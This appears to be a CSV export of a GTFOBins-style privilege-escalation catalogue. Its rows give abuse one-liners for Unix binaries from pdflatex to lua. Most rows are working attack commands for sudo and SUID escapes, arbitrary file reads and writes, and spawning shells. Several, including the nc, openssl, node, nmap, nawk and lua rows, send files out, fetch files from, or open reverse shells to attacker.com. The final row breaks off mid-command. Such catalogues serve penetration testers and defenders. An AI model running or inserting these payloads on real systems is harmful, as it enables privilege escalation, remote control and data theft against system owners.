"pdflatex","","","pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","","The read file will be part of the output.","[''sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' pdftotext article.pdf - ''-|-''sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}' '']","","","pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' pdftotext article.pdf -","","","","","","./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","","","","The read file will be part of the output.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pdb","","","TF=$(mktemp) echo 'import os; os.system(""/bin/sh"")' > $TF pdb $TF cont","","","TF=$(mktemp) echo 'import os; os.system(""/bin/sh"")' > $TF sudo pdb $TF cont","This allows to execute [`python`](/gtfobins/python/) code, other functions may apply.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pax","","","","","","","","","LFILE=file_to_read pax -w ""$LFILE""","","","","","","","","","","The output is a `tar` archive containing the read file as it is, hence this may not be suitable to read arbitrary binary files.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"paste","","","","","","LFILE=file_to_read sudo paste $LFILE","","","LFILE=file_to_read paste $LFILE","","LFILE=file_to_read paste $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"pandoc","","Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.","TF=$(mktemp) echo 'os.execute(""/bin/sh"")' >$TF pandoc -L $TF /dev/null","","Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.","TF=$(mktemp) echo 'os.execute(""/bin/sh"")' >$TF sudo pandoc -L $TF /dev/null","","","LFILE=file_to_read pandoc -t plain ""$LFILE""","","LFILE=file_to_write echo DATA | ./pandoc -t plain -o ""$LFILE""","","LFILE=file_to_write echo DATA | pandoc -t plain -o ""$LFILE""","","TF=$(mktemp) echo 'os.execute(""/bin/sh"")' >$TF ./pandoc -L $TF /dev/null","","","","","","","","","","","","","","","","","","","","","","","","","","","","Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.","","","","false"
"opkg","","","","","It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` TF=$(mktemp -d) echo 'exec /bin/sh' > $TF/x.sh fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF ```","sudo opkg install x_1.0_all.deb","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"openvt","","","","","The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file.","COMMAND=id TF=$(mktemp -u) sudo openvt -- sh -c ""$COMMAND >$TF 2>&1"" cat $TF","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"openvpn","","","openvpn --dev null --script-security 2 --up '/bin/sh -c sh'","","The file is actually parsed and the first partial wrong line is returned in an error message.","[''sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh' ''-|-''LFILE=file_to_read sudo openvpn --config ""$LFILE""'']","","","LFILE=file_to_read openvpn --config ""$LFILE""","","[''./openvpn --dev null --script-security 2 --up '/bin/sh -p -c ""sh -p""' ''-|-''LFILE=file_to_read ./openvpn --config ""$LFILE"" '']","","","","","","","","The file is actually parsed and the first partial wrong line is returned in an error message.","The file is actually parsed and the first partial wrong line is returned in an error message.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"openssl","","","","","To receive the shell run the following on the attacker box:      openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes     openssl s_server -quiet -key key.pem -cert cert.pem -port 12345  Communication between attacker and target will be encrypted.","RHOST=attacker.com RPORT=12345 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s","","","LFILE=file_to_read openssl enc -in ""$LFILE""","","[''RHOST=attacker.com RPORT=12345 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s ''-|-''LFILE=file_to_write echo DATA | openssl enc -out ""$LFILE"" '']","","[''LFILE=file_to_write echo DATA | openssl enc -out ""$LFILE"" ''-|-''LFILE=file_to_write TF=$(mktemp) echo ""DATA"" > $TF openssl enc -in ""$TF"" -out ""$LFILE"" '']","","","","To send the file run the following on the attacker box:      openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes     openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send  Fetch a file from a TCP port, transmission will be encrypted.","RHOST=attacker.com RPORT=12345 LFILE=file_to_save openssl s_client -quiet -connect $RHOST:$RPORT > ""$LFILE""","","To receive the shell run the following on the attacker box:      openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes     openssl s_server -quiet -key key.pem -cert cert.pem -port 12345  Communication between attacker and target will be encrypted.","","","","","","","","To collect the file run the following on the attacker box:      openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes     openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save  Send a local file via TCP. Transmission will be encrypted.","RHOST=attacker.com RPORT=12345 LFILE=file_to_send openssl s_client -quiet -connect $RHOST:$RPORT < ""$LFILE""","","","To receive the shell run the following on the attacker box:      openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes     openssl s_server -quiet -key key.pem -cert cert.pem -port 12345  Communication between attacker and target will be encrypted.","RHOST=attacker.com RPORT=12345 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s","","","","","","openssl req -engine ./lib.so","","","","","","","","false"
"od","","","","","","LFILE=file_to_read sudo od -An -c -w9999 ""$LFILE""","Three spaces are added before each character in the read file, and non-printable chars are printed as backslash escape sequences.","","LFILE=file_to_read od -An -c -w9999 ""$LFILE""","","LFILE=file_to_read ./od -An -c -w9999 ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"octave","","","octave-cli --eval 'system(""/bin/sh"")'","","","sudo octave-cli --eval 'system(""/bin/sh"")'","The payloads are compatible with GUI.","","octave-cli --eval 'format none; fid = fopen(""file_to_read""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'","","","","octave-cli --eval 'filename = ""file_to_write""; fid = fopen(filename, ""w""); fputs(fid, ""DATA""); fclose(fid);'","","./octave-cli --eval 'system(""/bin/sh"")'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ntpdate","","","","","","LFILE=file_to_read sudo ntpdate -a x -k $LFILE -d localhost","The file is actually parsed and lines are leaked through error messages.","","LFILE=file_to_read ntpdate -a x -k $LFILE -d localhost","","LFILE=file_to_read ./ntpdate -a x -k $LFILE -d localhost","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"nsenter","","","nsenter /bin/sh","","","sudo nsenter /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"nroff","","","TF=$(mktemp -d) echo '#!/bin/sh' > $TF/groff echo '/bin/sh' >> $TF/groff chmod +x $TF/groff GROFF_BIN_PATH=$TF nroff","","","TF=$(mktemp -d) echo '#!/bin/sh' > $TF/groff echo '/bin/sh' >> $TF/groff chmod +x $TF/groff sudo GROFF_BIN_PATH=$TF nroff","","","LFILE=file_to_read nroff $LFILE","","","","","","","","","","The file is typeset and some warning messages may appear.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"npm","","Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.","[''npm exec /bin/sh''-|-''TF=$(mktemp -d) echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json npm -C $TF i '']","","Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.","TF=$(mktemp -d) echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json sudo npm -C $TF --unsafe-perm i","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"nohup","","","nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""","","","sudo nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""","","","","","./nohup /bin/sh -p -c ""sh -p <$(tty) >$(tty) 2>$(tty)""","","","","","","","","","","","","","","","COMMAND='/usr/bin/id' nohup ""$COMMAND"" cat nohup.out","","","","","","","","","","","","","","","","","","","","","false"
"node","","","node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'","","","sudo node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'","","","node -e 'process.stdout.write(require(""fs"").readFileSync(""/bin/ls""))'","","./node -e 'require(""child_process"").spawn(""/bin/sh"", [""-p""], {stdio: [0, 1, 2]})'","","node -e 'require(""fs"").writeFileSync(""file_to_write"", ""DATA"")'","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save node -e 'require(""http"").get(process.env.URL, res => res.pipe(require(""fs"").createWriteStream(process.env.LFILE)))'","","","","","","","","","","Send a local file via HTTP POST request.","export URL=http://attacker.com export LFILE=file_to_send node -e 'require(""fs"").createReadStream(process.env.LFILE).pipe(require(""http"").request(process.env.URL))'","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 node -e 'sh = require(""child_process"").spawn(""/bin/sh""); require(""net"").connect(process.env.RPORT, process.env.RHOST, function () {   this.pipe(sh.stdin);   sh.stdout.pipe(this);   sh.stderr.pipe(this); })'","","","","","","","","","./node -e 'process.setuid(0); require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'","","","Run `nc target.com 12345` on the attacker box to connect to the shell.","export LPORT=12345 node -e 'sh = require(""child_process"").spawn(""/bin/sh""); require(""net"").createServer(function (client) {   client.pipe(sh.stdin);   sh.stdout.pipe(client);   sh.stderr.pipe(client); }).listen(process.env.LPORT)'","false"
"nmap","","[''Input echo is disabled.''-|-''The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.'']","[''TF=$(mktemp) echo 'os.execute(""/bin/sh"")' > $TF nmap --script=$TF ''-|-''nmap --interactive nmap> !sh '']","","[''Input echo is disabled.''-|-''The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.'']","[''TF=$(mktemp) echo 'os.execute(""/bin/sh"")' > $TF sudo nmap --script=$TF ''-|-''sudo nmap --interactive nmap> !sh '']","","","[''TF=$(mktemp) echo 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);' > $TF nmap --script=$TF ''-|-''nmap -iL file_to_read '']","","LFILE=file_to_write ./nmap -oG=$LFILE DATA","","[''TF=$(mktemp) echo 'local f=io.open(""file_to_write"", ""wb""); f:write(""data""); io.close(f);' > $TF nmap --script=$TF ''-|-''LFILE=file_to_write nmap -oG=$LFILE DATA '']","","TF=$(mktemp) echo 'os.execute(""/bin/sh"")' > $TF ./nmap --script=$TF","","[''Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080.''-|-''Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file.'']","[''RHOST=attacker.com RPORT=8080 TF=$(mktemp -d) LFILE=file_to_save nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE ''-|-''export LPORT=12345 export LFILE=file_to_save TF=$(mktemp) echo 'local k=require(""socket""); local s=assert(k.bind(""*"",os.getenv(""LPORT""))); local c=s:accept(); local d,x=c:receive(""*a""); c:close(); local f=io.open(os.getenv(""LFILE""), ""wb""); f:write(d); io.close(f);' > $TF nmap --script=$TF '']","The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.","The payload appears inside the regular nmap output.","","Run ``nc -l -p 12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 TF=$(mktemp) echo 'local s=require(""socket""); local t=assert(s.tcp()); t:connect(os.getenv(""RHOST""),os.getenv(""RPORT"")); while true do   local r,x=t:receive();local f=assert(io.popen(r,""r""));   local b=assert(f:read(""*a""));t:send(b); end; f:close();t:close();' > $TF nmap --script=$TF","","","","","[''Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.''-|-''Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file.'']","[''RHOST=attacker.com RPORT=8080 LFILE=file_to_send nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send TF=$(mktemp) echo 'local f=io.open(os.getenv(""LFILE""), 'rb') local d=f:read(""*a"") io.close(f); local s=require(""socket""); local t=assert(s.tcp()); t:connect(os.getenv(""RHOST""),os.getenv(""RPORT"")); t:send(d); t:close();' > $TF nmap --script=$TF '']","The payload appears inside the regular nmap output.","","","","","Run `nc target.com 12345` on the attacker box to connect to the shell.","export LPORT=12345 TF=$(mktemp) echo 'local k=require(""socket""); local s=assert(k.bind(""*"",os.getenv(""LPORT""))); local c=s:accept(); while true do   local r,x=c:receive();local f=assert(io.popen(r,""r""));   local b=assert(f:read(""*a""));c:send(b); end;c:close();f:close();' > $TF nmap --script=$TF","","","","","","","Input echo is disabled.","","","","false"
"nm","","","","","","LFILE=file_to_read sudo nm @$LFILE","The file content is treated as command line options and disclosed through error messages, so this is not suitable for reading arbitrary binary data.","","LFILE=file_to_read nm @$LFILE","","LFILE=file_to_read ./nm @$LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"nl","","","","","","LFILE=file_to_read sudo nl -bn -w1 -s '' $LFILE","The read file content is corrupted by a leading space added to each line.","","LFILE=file_to_read nl -bn -w1 -s '' $LFILE","","LFILE=file_to_read ./nl -bn -w1 -s '' $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"nice","","","nice /bin/sh","","","sudo nice /bin/sh","","","","","./nice /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"nft","","","","","","LFILE=file_to_read sudo nft -f ""$LFILE""","The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files. This requires version `nftables` v0.9.0.","","LFILE=file_to_read nft -f ""$LFILE""","","LFILE=file_to_read ./nft -f ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"neofetch","","","TF=$(mktemp) echo 'exec /bin/sh' >$TF neofetch --config $TF","","","TF=$(mktemp) echo 'exec /bin/sh' >$TF sudo neofetch --config $TF","","","LFILE=file_to_read neofetch --ascii $LFILE","","","","","","","","","","The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ncftp","","","ncftp !/bin/sh","","","sudo ncftp !/bin/sh","","","","","./ncftp !/bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ncdu","","","ncdu b","","","sudo ncdu b","","","","","","","","","./ncdu b","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"nc","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.","RHOST=attacker.com RPORT=12345 sudo nc -e /bin/sh $RHOST $RPORT","","","","","","","","","RHOST=attacker.com RPORT=12345 ./nc -e /bin/sh $RHOST $RPORT","","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file.","LPORT=12345 LFILE=file_to_save nc -l -p $LPORT > ""$LFILE""","","","","","","","","","","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file.","RHOST=attacker.com RPORT=12345 LFILE=file_to_send nc $RHOST $RPORT < ""$LFILE""","","","Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.","RHOST=attacker.com RPORT=12345 nc -e /bin/sh $RHOST $RPORT","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.","","Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.","LPORT=12345 nc -l -p $LPORT -e /bin/sh","false"
"nawk","","","nawk 'BEGIN {system(""/bin/sh"")}'","","","sudo nawk 'BEGIN {system(""/bin/sh"")}'","","","LFILE=file_to_read nawk '//' ""$LFILE""","","LFILE=file_to_read ./nawk '//' ""$LFILE""","","LFILE=file_to_write nawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","","./nawk 'BEGIN {system(""/bin/sh"")}'","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","RHOST=attacker.com RPORT=12345 nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {     s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;     while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;     while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","","","","","","","","","","","","Run `nc target.com 12345` on the attacker box to connect to the shell.","LPORT=12345 nawk -v LPORT=$LPORT 'BEGIN {     s = ""/inet/tcp/"" LPORT ""/0/0"";     while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;     while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","","","","","","","","","","","false"
"nasm","","","","","","LFILE=file_to_read sudo nasm -@ $LFILE","The file content is treated as command line options and disclosed throught error messages, so this is not suitable for reading arbitrary binary data.","","LFILE=file_to_read nasm -@ $LFILE","","LFILE=file_to_read ./nasm -@ $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"nano","","The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.","[''nano ^R^X reset; sh 1>&0 2>&0 ''-|-''nano -s /bin/sh /bin/sh ^T '']","","","sudo nano ^R^X reset; sh 1>&0 2>&0","","","nano file_to_read","","","","nano file_to_write DATA ^O","","./nano -s /bin/sh /bin/sh ^T","","","","","","","","","","","","","","","","","","","","","","","","","","","","The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.","","","","false"
"mysql","","","mysql -e '\! /bin/sh'","","","sudo mysql -e '\! /bin/sh'","A valid MySQL server must be available.","","","","","","","","./mysql -e '\! /bin/sh'","","","","","","","","","","","","","","","","","","","","","","","A MySQL server must accept connections in order for this to work.  The following loads the `/path/to/lib.so` shared object.","mysql --default-auth ../../../../../path/to/lib","","","","","","","","false"
"mv","","","","","","LFILE=file_to_write TF=$(mktemp) echo ""DATA"" > $TF sudo mv $TF $LFILE","This can be used to move and then read or write files from a restricted file systems or with elevated privileges.","","","","LFILE=file_to_write TF=$(mktemp) echo ""DATA"" > $TF ./mv $TF $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"multitime","","","multitime /bin/sh","","","sudo multitime /bin/sh","","","","","./multitime /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"mtr","","","","","","LFILE=file_to_read sudo mtr --raw -F ""$LFILE""","The read file content is corrupted by error prints.","","LFILE=file_to_read mtr --raw -F ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msguniq","","","","","","LFILE=file_to_read sudo msguniq -P $LFILE","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.","","LFILE=file_to_read msguniq -P $LFILE","","LFILE=file_to_read ./msguniq -P $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msgmerge","","","","","","LFILE=file_to_read sudo msgmerge -P $LFILE /dev/null","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.","","LFILE=file_to_read msgmerge -P $LFILE /dev/null","","LFILE=file_to_read ./msgmerge -P $LFILE /dev/null","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msgfilter","","Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.","echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'","","Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.","echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'","","","LFILE=file_to_read msgfilter -P -i ""LFILE"" /bin/cat","","echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'","","","","","","","","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other *filter* program.","Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msgconv","","","","","","LFILE=file_to_read sudo msgconv -P $LFILE","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.","","LFILE=file_to_read msgconv -P $LFILE","","LFILE=file_to_read ./msgconv -P $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msgcat","","","","","","LFILE=file_to_read sudo msgcat -P $LFILE","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.","","LFILE=file_to_read msgcat -P $LFILE","","LFILE=file_to_read ./msgcat -P $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msgattrib","","","","","","LFILE=file_to_read sudo msgattrib -P $LFILE","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.","","LFILE=file_to_read msgattrib -P $LFILE","","LFILE=file_to_read ./msgattrib -P $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msfconsole","","","sudo msfconsole msf6 > irb >> system(""/bin/sh"")","","","sudo msfconsole msf6 > irb >> system(""/bin/sh"")","This allows to spawn a [`ruby`](/gtfobins/ruby/) interpreter.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"mount","","","","","Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell.","sudo mount -o bind /bin/sh /bin/mount sudo mount","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"mosquitto","","","","","","LFILE=file_to_read sudo mosquitto -c ""$LFILE""","The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message, thus it may not be suitable for reading arbitrary files","","LFILE=file_to_read mosquitto -c ""$LFILE""","","LFILE=file_to_read ./mosquitto -c ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"more","","","TERM= more /etc/profile !/bin/sh","","","TERM= sudo more /etc/profile !/bin/sh","","","more file_to_read","","./more file_to_read","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"minicom","","[''Start the following command to open the TUI interface, then: 1. press `Ctrl-A o` and select `Filenames and paths`; 2. press `e`, type `/bin/sh`, then `Enter`; 3. Press `Esc` twice; 4. Press `Ctrl-A k` to drop the shell. After the shell, exit with `Ctrl-A x`. ''-|-''After the shell, exit with `Ctrl-A x`. '']","[''minicom -D /dev/null ''-|-''TF=$(mktemp) echo ""! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)"" >$TF minicom -D /dev/null -S $TF reset^J '']","","Start the following command to open the TUI interface, then: 1. press `Ctrl-A o` and select `Filenames and paths`; 2. press `e`, type `/bin/sh`, then `Enter`; 3. Press `Esc` twice; 4. Press `Ctrl-A k` to drop the shell. After the shell, exit with `Ctrl-A x`.","sudo minicom -D /dev/null","Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.","","","","./minicom -D /dev/null","","","","","","","","","Start the following command to open the TUI interface, then: 1. press `Ctrl-A o` and select `Filenames and paths`; 2. press `e`, type `/bin/sh -p`, then `Enter`; 3. Press `Esc` twice; 4. Press `Ctrl-A k` to drop the shell. After the shell, exit with `Ctrl-A x`.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"mawk","","","mawk 'BEGIN {system(""/bin/sh"")}'","","","sudo mawk 'BEGIN {system(""/bin/sh"")}'","","","LFILE=file_to_read mawk '//' ""$LFILE""","","LFILE=file_to_read ./mawk '//' ""$LFILE""","","LFILE=file_to_write mawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","","./mawk 'BEGIN {system(""/bin/sh"")}'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"man","","This only works for GNU `man` and requires GNU `troff` (`groff` to be installed).","[''man man !/bin/sh ''-|-''man '-H/bin/sh #' man '']","","","sudo man man !/bin/sh","This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.","","man file_to_read","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"make","","","COMMAND='/bin/sh' make -s --eval=$'x:\n\t-'""$COMMAND""","","","COMMAND='/bin/sh' sudo make -s --eval=$'x:\n\t-'""$COMMAND""","All these examples only work with GNU `make` due to the lack of support of the `--eval` flag. The same can be achieved by using a proper `Makefile` or by passing the content via stdin using `-f -`.","","","","COMMAND='/bin/sh -p' ./make -s --eval=$'x:\n\t-'""$COMMAND""","","LFILE=file_to_write make -s --eval=""\$(file >$LFILE,DATA)"" .","","","","","","","","","","","","","","","","","Requires a newer GNU `make` version.","","","","","","","","","","","","","","","","","false"
"mail","","[''GNU version only.''-|-''This creates a valid Mbox file which may be required by the binary.'']","[''mail --exec='!/bin/sh'''-|-''TF=$(mktemp) echo ""From nobody@localhost $(date)"" > $TF mail -f $TF !/bin/sh '']","","GNU version only.","sudo mail --exec='!/bin/sh'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"lwp-request","","","","","","LFILE=file_to_read sudo lwp-request ""file://$LFILE""","","","LFILE=file_to_read lwp-request ""file://$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"lwp-download","","","","","","URL=http://attacker.com/file_to_get LFILE=file_to_save sudo lwp-download $URL $LFILE","Fetch a remote file via HTTP GET request.","","LFILE=file_to_read TF=$(mktemp) lwp-download ""file://$LFILE"" $TF cat $TF","","","","LFILE=file_to_write TF=$(mktemp) echo DATA >$TF lwp-download file://$TF $LFILE","","","","","URL=http://attacker.com/file_to_get LFILE=file_to_save lwp-download $URL $LFILE","The file path must be absolute.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"luatex","","","luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'","","","sudo luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'","This allows to execute [`lua`](/gtfobins/lua/) code.","","","","","","","","./luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"lualatex","","","lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'","","","sudo lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'","This allows to execute [`lua`](/gtfobins/lua/) code.","","","","","","","","./lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"lua","","","lua -e 'os.execute(""/bin/sh"")'","","","sudo lua -e 'os.execute(""/bin/sh"")'","","","lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'","","lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'","","lua -e 'local f=io.open(""file_to_write"", ""wb""); f:write(""DATA""); io.close(f);'","","./lua -e 'os.execute(""/bin/sh"")'","","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires `lua-socket` installed.","export LPORT=12345 export LFILE=file_to_save lua -e 'local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   local d,x=c:receive(""*a"");   c:close();   local f=io.open(os.getenv(""LFILE""), ""wb"");   f:write(d);   io.close(f);'","","","","Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed.","export RHOST=attacker.com export RPORT=12345 lua -e 'local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   while true do     local r,x=t:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));t:send(b);   end;   f:close();t:close();'","","","","","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires `lua-socket` installed.","RHOST=attacker.com RPORT=12345 LFILE=file_to_send lua -e '   local f=io.open(os.getenv(""LFILE""), 'rb')   local d=f:read(""*a"")   io.close(f);   local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   t:send(d);   t:close();'","","","","","","Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.","export LPORT=12345 lua -e 'local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   